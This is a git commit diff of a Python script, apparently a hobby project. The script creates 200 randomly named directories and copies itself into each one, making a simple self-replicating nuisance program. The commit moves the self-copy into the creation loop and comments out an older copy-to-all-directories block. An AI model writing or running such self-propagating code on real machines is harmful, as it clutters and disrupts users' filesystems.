9d05ea3c421f0f9d06b7376c1474b24d1a90b1e9
Archie <69575053+thatOneArchUser@users.noreply.github.com>
2022-09-01 11:43:02 +0300

    Update main.py

--- main.py
+++ main.py
@@ -17,13 +17,17 @@ count = 0
 while count < 200:
     name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
     time.sleep(1) #cooldown, lower the value to make the process faster, higher the value to make the process slower (prevent lags)
-    os.mkdir(f"{cwd}{sep}{name}{count}")
+    #os.mkdir(f"{cwd}{sep}{name}{count}")
+    os.mkdir(name)
+    os.chdir(name)
+    shutil.copy(f"../{sys.argv[0]}", os.getcwd())
+    os.chdir(cwd)
     count += 1
     
-if count == 200:
-    all = os.listdir(cwd)
-    for dir in all:
-        if dir == "main.py": pass #skip existed (this file) main.py in current directory, if you already have 1 file named "main.py" in current working directory (cwd), please change the name of this file and change "main.py" in this line to this file's name after changes
-        else:
-            time.sleep(1)
-            shutil.copy(f"{cwd}{sep}main.py", dir) #copies itself (remember to change file name) to all directories in cwd
+# if count == 200:
+#     all = os.listdir(cwd)
+#     for dir in all:
+#         if dir == "main.py": pass #skip existed (this file) main.py in current directory, if you already have 1 file named "main.py" in current working directory (cwd), please change the name of this file and change "main.py" in this line to this file's name after changes
+#         else:
+#             time.sleep(1)
+#             shutil.copy(f"{cwd}{sep}main.py", dir) #copies itself (remember to change file name) to all directories in cwd
